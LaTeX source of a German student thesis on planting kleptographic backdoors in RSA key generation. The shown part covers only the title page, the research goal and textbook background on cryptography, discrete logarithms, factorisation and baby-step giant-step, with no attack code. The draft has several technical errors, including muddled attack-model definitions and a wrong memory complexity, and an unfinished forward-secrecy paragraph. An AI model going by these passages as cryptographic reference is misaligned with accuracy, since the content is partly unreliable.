%&bericht

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% Descr:       Vorlage für Berichte der DHBW-Karlsruhe
%% Author:      Prof. Dr. Jürgen Vollmer, juergen.vollmer@dhbw-karlsruhe.de
%% $Id: bericht.tex,v 1.25 2020/03/13 15:07:45 vollmer Exp $
%%  -*- coding: utf-8 -*-
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\documentclass[
   ngerman          % neue deutsche Rechtschreibung
  ,a4paper          % Papiergrösse
% ,twoside          % Zweiseitiger Druck (rechts/links)
% ,10pt             % Schriftgrösse
  ,11pt
% ,12pt
  ,pdftex
%  ,disable         % Todo-Markierungen auschalten
]{report}

% Bitte die Codierung Ihrer Dateien auswählen:
% \usepackage[latin1]{inputenc}    % Für UNIX mit ISO-LATIN-codierten Dateien
% \usepackage[applemac]{inputenc}  % Für Apple Mac
% \usepackage[ansinew]{inputenc}   % Für Microsoft Windows
\usepackage[utf8]{inputenc}        % UTF-8 codierte Dateien
                                   % Dieses Dokument ist unter Unix erstellt, daher
                                   % wird diese Input-Codierung benutzt.

\usepackage{bericht}
\usepackage{amsmath}
\usepackage{listings}
% color def
\usepackage{color}
\definecolor{darkred}{rgb}{0.6,0.0,0.0}
\definecolor{darkgreen}{rgb}{0,0.50,0}
\definecolor{lightblue}{rgb}{0.0,0.42,0.91}
\definecolor{orange}{rgb}{0.99,0.48,0.13}
\definecolor{grass}{rgb}{0.18,0.80,0.18}
\definecolor{pink}{rgb}{0.97,0.15,0.45}

% listings
\usepackage{listings}

% General Setting of listings
\lstset{
  aboveskip=1em,
  breaklines=true,
  abovecaptionskip=-6pt,
  captionpos=b,
  escapeinside={\%*}{*)},
  frame=single,
  numbers=left,
  numbersep=15pt,
  numberstyle=\tiny,
}
% 0. Basic Color Theme
\lstdefinestyle{colored}{ %
  basicstyle=\ttfamily,
  backgroundcolor=\color{white},
  commentstyle=\color{green}\itshape,
  keywordstyle=\color{blue}\bfseries\itshape,
  stringstyle=\color{red},
}
% 1. General Python Keywords List
\lstdefinelanguage{PythonPlus}[]{Python}{
  morekeywords=[1]{,as,assert,nonlocal,with,yield,self,True,False,None,} % Python builtin
  morekeywords=[2]{,__init__,__add__,__mul__,__div__,__sub__,__call__,__getitem__,__setitem__,__eq__,__ne__,__nonzero__,__rmul__,__radd__,__repr__,__str__,__get__,__truediv__,__pow__,__name__,__future__,__all__,}, % magic methods
  morekeywords=[3]{,object,type,isinstance,copy,deepcopy,zip,enumerate,reversed,list,set,len,dict,tuple,range,xrange,append,execfile,real,imag,reduce,str,repr,}, % common functions
  morekeywords=[4]{,Exception,NameError,IndexError,SyntaxError,TypeError,ValueError,OverflowError,ZeroDivisionError,}, % errors
  morekeywords=[5]{,ode,fsolve,sqrt,exp,sin,cos,arctan,arctan2,arccos,pi, array,norm,solve,dot,arange,isscalar,max,sum,flatten,shape,reshape,find,any,all,abs,plot,linspace,legend,quad,polyval,polyfit,hstack,concatenate,vstack,column_stack,empty,zeros,ones,rand,vander,grid,pcolor,eig,eigs,eigvals,svd,qr,tan,det,logspace,roll,min,mean,cumsum,cumprod,diff,vectorize,lstsq,cla,eye,xlabel,ylabel,squeeze,}, % numpy / math
}
% 2. New Language based on Python
\lstdefinelanguage{PyBrIM}[]{PythonPlus}{
  emph={d,E,a,Fc28,Fy,Fu,D,des,supplier,Material,Rectangle,PyElmt},
}
% 3. Extended theme
\lstdefinestyle{colorEX}{
  basicstyle=\ttfamily,
  backgroundcolor=\color{white},
  commentstyle=\color{darkgreen}\slshape,
  keywordstyle=\color{blue}\bfseries\itshape,
  keywordstyle=[2]\color{blue}\bfseries,
  keywordstyle=[3]\color{grass},
  keywordstyle=[4]\color{red},
  keywordstyle=[5]\color{orange},
  stringstyle=\color{darkred},
  emphstyle=\color{pink}\underbar,
}
\lstset{style=colorEX}
%% ACHTUNG, wenn man eine eigene Formatdatei (bericht.fmt) benutzt, werden Änderungen an bericht.sty
%% erst wirksam, wenn die Format-Datei neu erzeugt wurde!!!
%% Genauer alle Änderungen, die textuell vor der nächsten Zeile ".... endofdump...." stehen
%% werden erst wirksam, wenn die Formatdatei neu erzeugt wurde
\csname endofdump\endcsname

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% Angaben zur Arbeit
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\Autor}{Yannic Hemmer}
\newcommand{\MatrikelNummer}{6853472}
\newcommand{\Kursbezeichnung}{TINF19B2}

\newcommand{\FirmenName}{SySS GmbH}
\newcommand{\FirmenStadt}{Tübingen}
%SELF \newcommand{\FirmenLogoDeckblatt}{\fbox{\includegraphics[width=3cm]{lion}}}

% Falls es kein Firmenlogo gibt:
%  \newcommand{\FirmenLogoDeckblatt}{}

\newcommand{\BetreuerFirma}{-}
\newcommand{\BetreuerDHBW}{Rolf Felder}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

% Wird auf dem Deckblatt und in der Erklärung benutzt:
% \newcommand{\Was}{Projekt-/Studien-/Bachleorarbeit}
%\newcommand{\Was}{Projektrarbeit}
\newcommand{\Was}{Studienarbeit}
%\newcommand{\Was}{Bachleorarbeit}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\Titel}{Proof of Concept für den Angriff eines IT-Systems durch Implementierung kleptographischer Schwachstellen in kryptographischen Bibliotheken}
\newcommand{\AbgabeDatum}{16. Mai 2022}

\newcommand{\Dauer}{24 Wochen}

% \newcommand{\Abschluss}{Bachelor of Engineering}
\newcommand{\Abschluss}{Bachelor of Science}

\newcommand{\Studiengang}{Informatik / Informationstechnik}
% \newcommand{\Studiengang}{Informatik / Angewandte Informatik}

\hypersetup{%%
  pdfauthor={\Autor},
  pdftitle={\Titel},
  pdfsubject={\Was}
}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

% Wenn \includeonly{..} benutzt wird, werden nur diese Kaptitel ausgegeben.
\includeonly{
  abk
 ,kapitel1
 ,kapitel2
 ,changelog
}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

% Benutzt man das "biblatex"-Paket, dann muß das hier stehen:
% siehe auch die mit BIBLATEX markierten Zeilen in bericht.sty
\bibliography{bericht}

\begin{document}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{titlepage}
\begin{center}
\vspace*{-2cm}
%SELF \FirmenLogoDeckblatt\hfill\includegraphics[width=4cm]{dhbw-logo}\\[2cm]
{\Huge \Titel}\\[1cm]
{\Huge\scshape \Was}\\[1cm]
{\large für die Prüfung zum}\\[0.5cm]
{\Large \Abschluss}\\[0.5cm]
{\large des Studienganges \Studiengang}\\[0.5cm]
{\large an der}\\[0.5cm]
{\large Dualen Hochschule Baden-Württemberg Karlsruhe}\\[0.5cm]
{\large von}\\[0.5cm]
{\large\bfseries \Autor}\\[1cm]
{\large Abgabedatum \AbgabeDatum}
\vfill
\end{center}
\begin{tabular}{l@{\hspace{2cm}}l}
Bearbeitungszeitraum	         & \Dauer 			\\
Matrikelnummer	                 & \MatrikelNummer		\\
Kurs			         & \Kursbezeichnung		\\
Ausbildungsfirma	         & \FirmenName			\\
			         & \FirmenStadt			\\
Betreuer der Ausbildungsfirma	 & \BetreuerFirma		\\
Gutachter der Studienakademie	 & \BetreuerDHBW		\\
\end{tabular}
\end{titlepage}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\input{erklaerung.tex}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\begin{abstract}
Dieses \LaTeX-Dokument kann als Vorlage für einen Praxis- oder Projektbericht, eine Studien- oder
Bachelorarbeit dienen.

Zusammengestellt von Prof.\,Dr.\,Jürgen Vollmer \email{juergen.vollmer@dhbw-karlsruhe.de}\\
\url{https://www.karlsruhe.dhbw.de}. Die jeweils aktuellste Version dieses \LaTeX-Paketes ist immer
auf der \emph{FAQ-Seite} des Studiengangs Informatik zu finden:
\url{https://www.karlsruhe.dhbw.de/inf/studienverlauf-organisatorisches.html} $\to$ \emph{Formulare und Vorlagen}.

\centering Stand \verb+$Date: 2020/03/13 15:07:45 $+
\end{abstract}

\newpage
\tableofcontents           % Inhaltsverzeichnis hier ausgeben
\listoffigures             % Liste der Abbildungen
\listoftables              % Liste der Tabellen
\lstlistoflistings         % Liste der Listings
\listofequations           % Liste der Formeln

% Jetzt kommt der "eigentliche" Text
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%% Descr:       Vorlage für Berichte der DHBW-Karlsruhe, Datei mit Abkürzungen
%% Author:      Prof. Dr. Jürgen Vollmer, vollmer@dhbw-karlsruhe.de
%% $Id: abk.tex,v 1.4 2017/10/06 14:02:03 vollmer Exp $
%% -*- coding: utf-8 -*-
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\chapter*{Abkürzungsverzeichnis}                   % chapter*{..} -->   keine Nummer, kein "Kapitel"
						         % Nicht ins Inhaltsverzeichnis
% \addcontentsline{toc}{chapter}{Akürzungsverzeichnis}   % Damit das doch ins Inhaltsverzeichnis kommt

% Hier werden die Abkürzungen definiert
\begin{acronym}[DHBW]
  % \acro{Name}{Darstellung der Abkürzung}{Langform der Abkürzung}
 \acro{Abk}[Abk.]{Abkürzung}

 % Folgendes benutzen, wenn der Plural einer Abk. benöigt wird
 % \newacroplural{Name}{Darstellung der Abkürzung}{Langform der Abkürzung}
 \newacroplural{Abk}[Abk-en]{Abkürzungen}


 \acro{RSA}[RSA]{Rivest-Shamir-Adleman}
 \acro{AES}[AES]{Advanced Encryption Standard}
 \acro{PFS}[PFS]{Perfect Forward Secrecy}
 \acro{TPM}[TPM]{Trusted Platform Module}
 \acro{SETUP}[SETUP]{Secretly Embedded Trapdoor with Universal Protection}

\end{acronym}
              % Abkürzungsverzeichnis

\chapter{Einleitung}

    \section{Problemfrage}
        Kryptographische Algorithmen bilden die Grundbausteine einer modernen, sicheren Kommunikation über öffentliche Netzwerke. Dabei garantieren sie Integrität, Vertraulichkeit und Authentizität. Folgend dem Kerckhoff Prinzip, nach welchem die Sicherheit eines kryptographischen Systems auf der Geheimhaltung der generierten Schlüssel beruht, kann die Sicherheit durch Kompromittierung der Schlüsselerstellung gebrochen werden.
        Kann eine RSA-Implementation bösartig verändert werden, dass ein Angreifer, die geheimen Parameter aller Schlüssel erfährt, jedoch ohne, dass dafür versteckte Kanäle genutzt werden und selbst wenn die Veränderungen bekannt werden, nur dem Angreifer in der Lage ist, die Schwachstelle auszunützen?
        Wie kann dies in moderner Open-Source Software realisiert werden und stellt dies eine Gefahr dar?

    \section{Ziel}
        Ziel der Arbeit ist die Entwicklung und Implementation einer kleptographischen Schwachstelle für RSA. Dabei soll die Korrektheit des Angriffes, die mathematischen Zusammenhänge und der Ablauf des Angriffs erläutert werden. Zusätzlich soll das Verfahren entsprechend optimiert werden, um das Risiko zeit-basierten Analysen zu vermeiden. 
        Es soll gezeigt werden, dass durch die Integration des Angriffs in eine öffentliche Krypto-Bibliothek gezeigt werden, dass die Schlüssel alle Nutzer dieser Bibliothek von einem Angreifer gebrochen werden können. Das Risiko eines solchen Angriffs soll aufgezeigt und evaluiert werden. 
\chapter{Grundlagen}

In diesem Kapitel werden die theoretischen Grundlagen der Kryptologie, Mathematik, Komplexitätstheorie und der IT-Sicherheit erläutert, die in dieser Arbeit eine Rolle spielen. Aus diesen sollen die grundlegenden Funktionen eines kleptographischen Angriffes und dessen Folgen abgeleitet werden.

\section{Kryptologie}
    Die Kryptologie ist die wissenschaftliche Disziplin für den Schutz von Daten. Unter ihr stehen die zwei Felder der Kryptographie und der Kryptoanalyse.

    \subsection{Kryptographie}
        Die Kryptologie befasst sich mit der Entwicklung von Verfahren und Techniken für den sicheren Austausch von Daten. Dabei stehen zwei Eigenschaften im Fokus:

        \subsubsection{Eigenschaften}
            \paragraph{Geheimhaltung}
                Durch Geheimhaltung sollen, bei der Übertragung von Daten zwischen Teilnehmern, Unbeteiligte keine Erkenntnisse über den Inhalt erlangen. Dies kann durch physikalische oder organisatorische Maßnahmen erreicht werden, wobei Unbeteiligten der Zugang zu den übertragenen Daten verwehrt wird. Diese Maßnahmen sind sinnvoll bei der Übergabe der Daten in einer nicht digitalen Welt. Bei der Kommunikation in digitalen Netzen, wie u.a. dem Internet, sind diese Maßnahmen nur schwer zu implementieren. Dies gilt nicht für kryptographische Maßnahmen. Dabei ist es nicht mehr das Ziel, Unbeteiligten den Zugang zu den übertragenen Daten zu erschweren, sondern den Inhalt der Daten während der Übertragung zu verschlüsseln. Dadurch soll es Unbeteiligten nahezu unmöglich sein, aus den mitgehörten oder abgefangenen Daten, Rückschlüsse auf deren Inhalt zu erlangen. \footcite[1]{BSW.2015}
                
            \paragraph{Authentifikation}
                Durch Authentifikation soll es den Teilnehmern einer Kommunikation möglich sein, die anderen Teilnehmer und empfangene Nachrichten zweifelsfrei identifizieren und zuweisen zu können. Hierbei spielen Signaturverfahren eine wichtige Rolle, da kein Geheimnis benötigt wird um einen Teilnehmer zu authentifizieren. Dabei können sich Teilnehmer durch das Wissen oder den Besitz eines Geheimnisses (Passwort, Zertifikat, Schlüssel) authentifizieren. \footcite[2]{BSW.2015}

        Nur wenn beide Eigenschaften gegeben sind ist eine Übertragung von Daten als sicher anzusehen. Falls die Geheimhaltung fehlt, kann der Inhalt durch Sniffing mitgelesen werden. Falls die Authentifikation der Teilnehmer fehlt, können sich Unbeteiligte als "echte" Teilnehmer ausgeben und somit die Daten an ihrem Endpunkt entschlüsseln.

        \subsubsection{Zusätzliche Eigenschaften}
            \paragraph{Perfect Forward Security} Perfect Forward Security

        \subsubsection{Kryptographische Verfahren}
            Kryptographische Verfahren sind Algorithmen, welche die Genheimhaltung von Daten und die Authentifikation von Teilnehmers und Nachrichten sicherstellt. Dadurch kann man sie in Verschlüsselungsverfahren und Authentifikationsverfahren unterscheiden. Dabei können Verfahren, wie z.B. \ac{RSA} beiden Aufgaben übernehmen.
        % Was sind Verschlüsselungsverfahren, Ziel, Historie, momentaner Stand, State of the Art (AES, RSA )
            \paragraph{Asymmetrische Verschlüsselung}
            % Hier angesprochene Verfahren, unterschiede, Definition / Abgrenzung zu symmetrischen Verfahren
            \label{Asymmetrische Verschlüsselnung}
                Bei asymmetrischen Verschlüsselungsverfahren wird statt dem gleichen Schlüssel für das Ver- und Entschlüsseln, zwei verschiedene Schlüssel verwendet. Dabei hat jeder Teilnehmer ein öffentlichen Schlüssel $e$ und einen privaten und geheimen Schlüssel $d$. Hierbei ist es vorgesehen, dass möglichst alle potenziellen Teilnehmer den Schlüssel $e$ kennen. Wenn eine Nachricht mit einem der beiden Schlüssel chiffriert wurde, kann nur mittels dem anderen Schlüssel dechiffriert werden. Somit können Nachrichten an einen Teilnehmer verschlüsselt versandt werden, indem diese mit dem öffentlichen Schlüssel $e$ des Teilnehmers chiffriert wird. Nun kann nur der Teilnehmer mit dem zugehörigen privaten Schlüssel $d$, die Nachricht verschlüsseln. Zusätzlich kann auch die Authentifikation von Teilnehmer und die Authentizität von Nachrichten mit hoher Sicherheit festgestellt werden. Somit kann der Author einer Nachricht, einen Fingerabdruck dieser Nachricht mit seinem privaten Schlüssel $d$ signieren, an die Nachricht anhängen und dann beide Teile verschlüsseln. Diese Signatur kann verifiziert werden, indem der Empfänger die Nachricht entschlüsselt und dann die Signatur verifiziert, indem er den öffentlichen Schlüssel des Authors $e$ auf diesen anwendet. Danach vergleicht er den empfangenen Fingerabdruck mit einem eigens erstellten Fingerabdruck. Somit kann die Geheimhaltung, Authentizität und Integrität der Nachricht bestimmt werden.
                
                Die zwei Schlüssel $e$ und $d$ eines Teilnehmers, werden auch als Schlüsselpaar bezeichnet. Ein solches verfahren, wird asymmetrisch genannt, da für das Ent- und Verschlüsseln zwei unterschiedliche Informationen vorliegen müssen. Diese Informationen sind auch nicht auseinander ableitbar, wie es z.B. bei multiplikativen Chiffren der Fall wäre. Die Funktionalität des Verfahrens, beruht auf der Annahme, dass alle Teilnehmer Zugang zu den öffentlichen Schlüssel jedes anderen Teilnehmers haben bzw. haben können. Durch diese Charakteristika werden solche Verfahren auch als Public-Key-Kryptographie bezeichnet.

                Dabei wird stets die Annahme getroffen, dass der private Schlüssel eines Teilnehmers ausschließlich diesem vorliegt. Anderenfalls ist die Geheimhaltung und die Authentifikation beim Informationsaustausch von und mit diesem Teilnehmer nicht mehr gewährleistet. Somit wäre die Sicherheit kompromittiert.
                
                Die Schlüssel eines Schlüsselpaar bilden somit Umkehrfunktionen zueinander.

            \paragraph{Hybride Verfahren}
            \label{Hybride Verfahren}
                % Meiste Verfahren heute hybride Verfahren. Asymmetrisch zum Schlüsselaustausch. Symmetrisch zum Verschlüsseln. Laufzeit von Asymmetrischen Verfahren. Wenn Schlüsselaustausch sicher Geheimhaltung verletzt.
                Asymmetrische Verschlüsselungsverfahren haben häufig den Nachteil, dass die deutlich rechenaufwändiges sind, wie wir später bei \ac{RSA} sehen werden. Es liegen zwar effiziente Verfahren vor, um z.B. die modularen Potenz aus zwei 300-stelligen Zahlen und einem Modulo zu bilden \ref{sec-Effiziente Berechnung der diskreten Exponentialfunktion}. Dennoch sind diese Verfahren mit mehr Aufwand verbunden, als z.B. symmetrische Blockchiffren wie \ac{AES}.
                
                Deshalb werden asymmetrische Verfahren für die Initialisierung der Kommunikation verwendet. In dieser Initialisierungsphase soll der Teilnehmer authentifiziert werden und ein gemeinsamer, geheimer, symmetrischer Schlüssel vereinbart werden. 
                
                In der darauffolgenden Kommunikationsphase werden die Nachrichten durch symmetrische Chiffren mittels des vereinbarten Schlüssels, effizient verschlüsselt und auf der Gegenseite entschlüsselt. Asymmetrisch Chiffren werden hier benutzt um Fingerabdrücke von Nachrichten zu signieren und zu verifizieren, wie oben \ref{Asymmetrische Verschlüsselnung} gezeigt. Zusätzlich werden durch asymmetrische Verfahren regelmäßig neue symmetrische Schlüssel vereinbart.

                Solche hybriden Verfahren sind z.B. beim Browsen im Internet zu finden: \textbf{$TLS\_ECDHE\_RSA\_WITH\_AES\_128\_GCM\_SHA256$}


    \subsection{Kryptoanalyse}
        \label{sec-Kryptoanalyse}
        Moderne kryptographische Verfahren, werden nach ihrer Sicherheit und ihrer Effizienz beurteilt. Dabei kann die Sicherheit eines Verfahrens auf mathematische Probleme gestützt werden, welche aktuell und in der nahen Zukunft nicht trivial lösbar sind. 

        Alle Angriffe auf kryptographische Verfahren, gelten dem Erlangen des Geheimtextes einer chiffrierten Nachricht oder dem Berechnen, des verwendeten Geheimnisses.

        Bei Angriffen auf das Geheimnis werden hier lediglich computergestützte Angriffe betrachtet, also nur Angriffe, die durch den Einsatz von Rechnerressourcen und Algorithmen versuchen, den geheimen Schlüssel zu bestimmen. Es wird im Allgemeinen davon ausgegangen, das Nutzergeheimnisse, wie Passwörter, Zertifikate und private Schlüssel nicht öffentlich zugänglich sind.
        Brute-Force Angriffe sind beispielhaft für die Angriffe. Hierbei wird systematisch der Zahlenraum (bzw. Zeichenraum) aller möglicher Schlüsselkombinationen durchprobiert. Weiterentwicklungen dieses Angriffs versuchen auf Grundlage von statistischen Erkenntnissen den Zahlenraum des Geheimnisses einzugrenzen, wie z.B. Wörterbuchangriffe. Hierbei ist die Länge und die Zufälligkeit des Geheimnisses der entscheidende Faktor für einen effektiven Schutz vor Angriffen.
        
        Um die Sicherheit von kryptographischen Verfahren beurteilen zu können, werden erfolgreiche Angriffe auf diese Verfahren, nach den hierfür notwendigen Voraussetzungen, unterteilt. \footcite[20]{Beutelspacher.2015}
        \paragraph{Known Cipher Attack}
            Hierbei benötigt der Angreifer beliebige Menge an verschlüsselten Text, um aus diesem den Schlüssel und somit den Geheimtext ableiten zu können.
        \paragraph{Known Plaintext Attack}
            Bei diesen Angriffen, kennt der Angreifer eine echte Teilmenge der verschlüsselten Textes und den dazugehörigen Geheimtext. Diese Angriffe sind erfolgreich, wenn sich aus einer echten Teilmenge des Klartextes und dem dazugehörigen Geheimtext, der verwendete Schlüssel berechnen lässt.  
        \paragraph{Chosen Plaintext Attack}
            Bei Chosen Plaintext Attack kann der Angreifer das Chiffrat zu einem von ihm gewählten Klartext berechnen. Dies ist ein klassischer Fall bei Public-Key-Kryptographie \ref{Asymmetrische Verschlüsselnung}, da hier der Algorithmus (Prinzip von Kerckhoff) und die Schlüssel öffentlich sind. Somit kann sich eine Angreifer zu jedem beliebigen Klartext das entsprechende Chiffrat berechnen. Angriffe haben diese Eigenschaft, wenn sich dadurch das Geheimnis (bei Public-Key-Kryptographie der private Schlüssel) berechnen lässt.
        
        Zusätzlich ist noch eine weitere Kategorie verwendbar:
        \paragraph{Chosen Chipher Attack}
            Hierbei kann der Angreifer jeglichen Geheimtext entschlüsseln. Zusätzlich liegen ihm eine beliebige Menge an abgefangenen Geheimtexten zur Verfügung. Dabei ist die natürlich die Vertraulichkeit bereits versandter Nachrichten kompromittiert. Jedoch ist hierbei das Ziel des Angriffs, das verwendete Geheimnis zu berechnen.
            
        Nur wenn für kryptographische Verfahren keiner der aufgeführten Stufen an Voraussetzungen ausreicht, um das verwendete Geheimnis zu berechnen sind diese als sicher zu betrachten. In dieser Arbeit wird mit kryptographischen Verfahren gearbeitet, die als sicher betrachtet werden können.

    \subsection{Prinzipien}
        In der Kryptologie gelten verschiedene Prinzipien. Diese sind zwar in der theoretischen Betrachtung nicht notwendig, haben aber in der realen Welt eine große Bedeutung.
        \subsubsection{Prefect Forward Security}
            \ac{PFS} ist ein Prinzip für kryptographische Verfahren, dass durch zukünftige Veröffentlichung des Geheimnisses, die Vertraulichkeit von in der Vergangenheit versandten Nachrichten nicht gefährdet ist. Dies wird garantiert dadurch, dass langlebige Geheimnisse (bzgl. der Speicherung und Nutzung) zusammen mit temporären Geheimnissen zur Verschlüsselung genutzt werden. Somit kann ein Angreifer, der alte Geheimtexte gesammelt hat und im Besitz des langlebigen Geheimnisses ist, die gespeicherten Geheimtexte nicht entschlüssel. Dies kann auch z.B. durch rotierende Geheimnisse, wie Sitzungsschlüssel erreicht werden.  

        \subsubsection{Prinzip von Kerckhoff}
            Das Prinzip von Kerckhoff besagt, dass die Sicherheit eines kryptographischen Verfahrens nicht auf der Geheimhaltung des Algorithmus beruhen darf. Dabei soll die Sicherheit alleinig auf dem verwendeten Geheimnisses und seiner Geheimhaltung beruhen. Natürlich sind Verfahren denkbar, die gegen Kerckhoff's Prinzip verstoßen denkbar, aber auf Grundlage der geschichtlicher Erkenntnisse zu vermeiden. \footcite[19]{Beutelspacher.2015}


\section{Mathematik}
    \subsection{Primzahlen} \label{sec-prim}
        Primzahlen werden in mehreren asymmetrischen Verfahren genutzt. Im Rahen dieser Arbeit wird die Menge aller Primzahlen als $\mathbb{P}$. definiert. Wenn eine Zahl prim ist, ist diese Element von $\mathbb{P}$. 
    
    \subsection{Konkatenation} \label{sec-bas-concat}
        Im Rahmen der Arbeit wird die Konkatenation von zwei Zahlen durch $||$ repräsentiert. Dabei werden die Zahlen in binärer Form (zur Basis 2) konkateniert, wobei beide Zahlen auf ihre maximale binäre Länge mit $0$ ergänzt werden. 
        \begin{equation}
            (a || b) = 010001 \mid a = 10, b=1, \overline{a}, \overline{b}  = 3
            \eqlabel{eq-math-||}{Normaler Logarithmus}
        \end{equation}
    
    \subsection{Binäre Länge} \label{sec-bas-lenBin}
        Im Rahmen der Arbeit wird die maximale Länge einer Zahl in Bits durch einen Überstrich $\overline{x}$ dargestellt. Für eine Zahl $x$ mit maximal $n/2$-Bits Länge würde dann gelten $\overline{x} = n/2$.

    Mathematische Probleme stellen die Grundlage für moderne Kryptographie. 

    \subsection{Diskreter Logarithmus}
    \label{sec-Diskreter Lograithmus}
        Bei der Bestimmung des Logarithmus wird der Exponent (hier: $x$) gesucht, welcher mit einer bekannten Zahl als Basis $z$, eine weitere bekannte Zahl $y$ ergibt.
        \begin{equation}
            z^{x} = y
            \eqlabel{eq-log}{Normaler Logarithmus}
        \end{equation}

        Der diskrete Logarithmus bezieht hier auf die Berechnung des Logarithmus in ein Gruppe. Diese Gruppe bildet sich aus der Rechnung mit Restklassen (modulo). Dadurch entsteht folgendes Problem, bei der die Variable $x$ gesucht wird und alle anderen Variablen bekannt sind.
        \begin{equation}
            z^{x} \pmod n \equiv y
            \eqlabel{eq-dis-log}{Diskreter Logarithmus}
        \end{equation}
        
        Hierbei ist in der Notation zu beachten, dass sich durch das Rechnen auf mit einer Gruppe, Äquivalenzklassen ($\equiv$) bilden. Diese entsprechen den Restklassen des Rechnen mit Modulo. $n$ ist die Mächtigkeit der Aquivalenzklassen.

        Die Bestimmung von $x$ in \ref{eq-dis-log} wird als Problem des diskreten Logarithmus bezeichnet. Mit der Komplexität wird sich in den Grundlagen der Komplexitätstheorie beschäftigt.

        Dabei ist die Umkehrfunktion, des diskreten Logarithmus $f(x)$ \ref{eq-dis-log}, mathematisch einfach zu berechnen. Diese Umkehrfunktion entspricht der diskreten Exponentialfunktion:
        \begin{equation}
            f^{-1}(x) = z^{x} \pmod n \equiv y
            \eqlabel{eq-dis-exp}{Diskretere Exponentialfunktion}
        \end{equation}
        Hierbei sind $z,x,n$ gegeben und $y$ gesucht.

    \subsection{Faktorisierung}
    \label{sec-Faktorisierung}
        Bei der Faktorisierung wird versucht eine Zahl in Faktoren zu zerlegen. Dabei handelt es sich, im Kontext der Kryptographie, meist um die Faktorisierung des Produkts  zweier großer Primzahlen. Dadurch bildet sich folgende Formel, wobei $p$ und $q$ Primzahlen sind (also Element der Menge der Primzahlen $\mathbb{P}$) und $n$ das resultierende Produkt:
        \begin{equation}
            n = p * q \mid p,q \in \mathbb{P}
            \eqlabel{eq-factor}{Faktorisierung großer Zahlen}
        \end{equation} 
        Da $n$ das Produkt zweier Primzahlen ist, sind seine einzigen Teiler: $n$ selbst, 1 und die seine Primfaktoren $p$ und $q$. Deshalb handelt es sich hierbei auch um eine Primfaktorzerlegung von $n$. 
        
        Dabei ist die Primfaktorzerlegung von $n$ ein rechenaufwändiges Problem, falls $p$ udn $q$ große Zahlen sind. Im Gegensatz dazu ist die Berechnung von bzw. die Validierung mit $n$ sehr einfach, da hierfür nur die Multiplikation von $p$ und $q$ notwendig ist. Somit liegt die gleiche Situation, wie beim Problem des diskreten Logarithmus \ref{sec-Diskreter Lograithmus} vor: Ein rechenaufwändiges Problem, dessen Umkehrfunktion sehr einfach ist \footcite[179]{BSW.2015}. 
    

    \subsection{Berechnung des diskreten Logarithmus}
    \label{sec-Berechnung des diskreten Logarithmus}
        Zur Berechnung des diskreten Logarithmus kann der Baby-Step / Giant-Step-Algorithmus verwendet werden. Dabei handelt es sich um ein Algorithmus, welcher das Problem des diskreten Logarithmus durch Kollisionssuche löst. Dafür wird ein "Time-Memory Tradeoff" eingegangen. Hierbei wird der Zeitaufwand zum Lösen eines Problems reduziert indem mehr Speicherplatz verwendet wird.
        Dabei befinden sich alle Operationen innerhalb einer zyklischen Gruppe der Ordnung $n$.
        
        Das vorliegende Problem:
        \begin{equation}
            a^{x} = b
            \eqlabel{eq-bsgs}{Baby-Step-Giant-Step-Algorithmus Problem}
        \end{equation}

        Zunächst wird $x$ mit $i \cdot m + j$ substituiert. Dabei ist $m = \lceil\sqrt{n}\rceil$ und $0 \leq i,j < m$.
        Danach wird \ref{eq-bsgs} umgeformt zu:
        \begin{equation}
            a^{j} = b \cdot (a^{-m})^{i}
            \eqlabel{eq-bsgs}{Baby-Step-Giant-Step-Algorithmus Substitution + Umformung}
        \end{equation}

        Im Baby-Step-Algorithmus werden alle Werte für $a^{j}$ berechnet ($0 \leq j < m$). Diese Werte werden so gespeichert, dass in $\mathcal{O}(1)$ geprüft werden kann, ob ein Wert schon berechnet wurde.

        Im Giant-Step-Algorithmus zunächst der konstante Wert für $a^{-m}$ berechnet wird. Danach wird für alle $\forall i: 0 \leq j < m$ $b \cdot (a^{-m})^{i}$ berechnet. Diese Ergebnisse werden gegen die Ergebnisse von den Baby-Step-Algorithmus verglichen. Falls es zu einer Kollision kommt wird $x$ mit $i \cdot m + j$ resubstituiert und somit der diskrete Logarithmus berechnet. 
        Die Zeitkomplexität ist $\mathcal{O}(\sqrt{n})$ während die Speicherkomplexität $\Omega(n)$ ist. \footcite[1]{mit:diclog}
        
